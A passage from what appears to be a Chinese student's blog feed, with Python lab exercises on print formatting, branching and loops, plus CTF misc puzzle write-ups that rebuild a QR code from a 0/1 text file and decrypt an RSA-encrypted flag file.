punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    </p><p>这一个脚本是处理一道RSA加密题目的，在网上找了类似的脚本，脚本不难理解，通过稍微改造就能适用问题，这个脚本的麻烦之处在于一些库的处理。</p><p>RSA库，base64库，gmpy2库都无法以简单的pip方式进行安装。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1和0的故事.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 7*7的定位标志</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 左上角定位标志</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># 左下角定位标志</span>        <span class="token keyword">elif</span> i <span class="token operator">></span> <span class="token number">17</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># 右上角定位标志</span>        <span class="token keyword">elif</span> i <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token keyword">and</span> j <span class="token operator">></span> <span class="token number">17</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>img<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个是一道已知01串补全二维码的脚本，在这个脚本上学到的是文件的读写和Image库作图的应用。</p><h2 id="实验二：虽然我也不知道我当时在干什么"><a href="#实验二：虽然我也不知道我当时在干什么" class="headerlink" title="实验二：虽然我也不知道我当时在干什么"></a><strong>实验二：虽然我也不知道我当时在干什么</strong></h2><p>今天上午的实验课，由于去年我已经安装和自学过python语言，完成课上的内容并没有花费很多时间，在完成课上的任务之外，我大部分的时间都在尝试安装并配置jupyter notebook的python环境。</p><p><a href="https://www.cnblogs.com/jiangfengtomhuo/p/7987419.html">配置方案</a>在CSDN里面我找到了这个配置的方案，但是在学校机房的尝试却没能成功。在我配置环境时cmd系统报错，提示环境变量的path的配置存在问题，在我将jupyter notebook对应的地址加入path变量时，cmd又报了另一个错误。由于没有保留截图，这里也无法展示，在后来请教老师也没有得出结论，后来回到宿舍在自己和舍友电脑上配置jupyter notebook想要复现当时出现问题，然而并没有出现什么问题。</p><p>最后怀疑是机房电脑是win7操作系统的原因，jupyter notebook可能没有兼容较低的windows版本。</p><p>不过整个实验课，我确实也是重新自己配置了一遍jupyter的在线编程环境，也是有所收获。</p><h2 id="实验四：Python-输出语句格式控制、顺序结构及分支结构"><a href="#实验四：Python-输出语句格式控制、顺序结构及分支结构" class="headerlink" title="实验四：Python 输出语句格式控制、顺序结构及分支结构"></a><strong>实验四：Python 输出语句格式控制、顺序结构及分支结构</strong></h2><p><strong>实验目的：</strong></p><p>1、熟练掌握 Python 输出语句格式控制符的用法。 </p><p>2、熟练判断条件表达式的真假。 </p><p>3、熟练掌握 Python 分支结构的用法。 </p><p><strong>实验内容：</strong></p><p>1、编写程序实现：课本实例 2-27，2-28，2-29，2-30，2-31，2-32。 </p><p>2-27 ：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token number">99</span><span class="token keyword">print</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%d'</span> <span class="token operator">%</span> a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%c'</span> <span class="token operator">%</span> a<span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token number">3.56789</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%f'</span> <span class="token operator">%</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b=%f"</span> <span class="token operator">%</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%10.3f'</span> <span class="token operator">%</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%-10.3f'</span> <span class="token operator">%</span> b<span class="token punctuation">)</span>str1<span class="token operator">=</span><span class="token string">"Welcome to Qufu Normal University"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%10s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%50s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%+50s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%-50s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a=%d,b=%f,c=%s"</span> <span class="token operator">%</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2-28 ：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shu1<span class="token operator">=</span><span class="token number">5</span>shu2<span class="token operator">=</span><span class="token number">7</span>shu3<span class="token operator">=</span>shu1<span class="token operator">*</span>shu2<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shu1=%d,shu2=%d,shu3=%d"</span><span class="token operator">%</span><span class="token punctuation">(</span>shu1<span class="token punctuation">,</span>shu2<span class="token punctuation">,</span>shu3<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2-29  :</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token string">"欢迎来到曲师大"</span>b<span class="token operator">=</span><span class="token number">123</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a=%s,b=%d,c=%d"</span> <span class="token operator">%</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2-30:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请从键盘上输入任意一个数给a变量:'</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请从键盘上输入任意一个数给b变量:'</span><span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> a<span class="token operator">></span>b<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大的数为:"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2-31:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请从键盘上输入任意一个数给a变量:'</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请从键盘上输入任意一个数给b变量:'</span><span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> a<span class="token operator">></span>b<span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大的数为:"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大的数为:"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2-32:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'从键盘上输入一个数:'</span><span class="token punctuation">)</span>cj<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> cj<span class="token operator">>=</span><span class="token number">90</span> <span class="token keyword">and</span> cj<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'优秀'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> cj<span class="token operator">>=</span><span class="token number">80</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'良好'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> cj<span class="token operator">>=</span><span class="token number">70</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'中等'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> cj<span class="token operator">>=</span><span class="token number">60</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'及格'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不及格'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、编写程序实现：分别定义一个整型、实型、字符串型变量并赋值，分别用不 </p><p>同的格式符控制输出。要求：</p><p>（1）在同一个 print 语句中同时输出三个变量的名字和值；</p><p>（2）一个 print 语句输出一个变量的名字和值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">num<span class="token operator">=</span><span class="token number">6</span>decimal<span class="token operator">=</span><span class="token number">6.6</span>string<span class="token operator">=</span><span class="token string">'6.66'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num=%d,decimal=%.2f,string=%s"</span> <span class="token operator">%</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>decimal<span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'num=%d'</span><span class="token operator">%</span>num<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'decimal=%.2f'</span><span class="token operator">%</span>decimal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'string=%s'</span><span class="token operator">%</span>string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、编写程序实现：输出整数 1234 的百位以上的数字。（提示：使用整除运算程序输出 12。） </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token number">1234</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">//</span><span class="token number">100</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、编写程序实现：定义一个整型变量并赋值，判断该数是正整数、负整数还是零。如果是正整数，输出’+’；如果是负整数，输出’-‘；如果是零，输出’0’。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入一个数："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> a<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">elif</span> a<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、编写程序实现：定义一个正整数变量（变量名定义为 n）并赋值，然后输出 它的奇偶性。如果奇数，结果输出为：”n 是奇数”；否则输出：”n 是偶数”。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入一个正整数："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> a<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%d是偶数"</span> <span class="token operator">%</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%d是奇数"</span> <span class="token operator">%</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6、编写程序实现：定义三个正整数变量并赋值，分别表示三条线段的长度，判 断这三条线段能否构成一个三角形。如果能构成三角形，则输出“yes” ，否 则输出“no”。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入三条边的长度"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">if</span> b<span class="token operator">></span>a<span class="token punctuation">:</span>  num<span class="token operator">=</span>a  a<span class="token operator">=</span>b  b<span class="token operator">=</span>num<span class="token keyword">if</span> c<span class="token operator">></span>a<span class="token punctuation">:</span>  num<span class="token operator">=</span>a  a<span class="token operator">=</span>c  c<span class="token operator">=</span>num<span class="token keyword">if</span> a<span class="token operator">*</span>a<span class="token operator">==</span><span class="token builtin">pow</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'NO'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两道老师要求用while实现的代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">String <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请先输入一个字符串：'</span><span class="token punctuation">)</span>Len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> count <span class="token operator">&lt;</span> Len<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> String<span class="token punctuation">[</span>count<span class="token punctuation">]</span> <span class="token operator">!=</span> String<span class="token punctuation">[</span>Len<span class="token operator">-</span>count<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">break</span> <span class="token keyword">else</span><span class="token punctuation">:</span>    count <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'是'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不是'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2：用while实现斐波那契数列。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i1<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i2<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span> flag<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>i1<span class="token punctuation">,</span>i2<span class="token punctuation">)</span>  i1<span class="token operator">=</span>i1<span class="token operator">+</span>i2  i2<span class="token operator">=</span>i1<span class="token operator">+</span>i2  flag<span class="token operator">+=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU靶场解题记录之misc(一)</title>
      <link href="/2021/08/01/BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc/"/>
      <url>/2021/08/01/BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc/</url>
      
        <content type="html"><![CDATA[<h4 id="BugkuCTF解题记录之misc（一）"><a href="#BugkuCTF解题记录之misc（一）" class="headerlink" title="BugkuCTF解题记录之misc（一）"></a>BugkuCTF解题记录之misc（一）</h4><hr><p>[TOC]</p><hr><h5 id="1、签到题"><a href="#1、签到题" class="headerlink" title="1、签到题"></a>1、签到题</h5><p>直接扫描二维码就行，这是最简单的签到题</p><h5 id="2、-0和1的故事"><a href="#2、-0和1的故事" class="headerlink" title="2、 0和1的故事"></a>2、 0和1的故事</h5><p>这道题是一个较为常见的二维码隐写题目，用0和1分别作为二维码的黑色与白色部分。在使用工具扫码得到flag。</p><p>这种题目的难点在于，二维码的生成，个人感觉还是用python写一个脚本做最方便。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1和0的故事.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 7*7的定位标志</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span 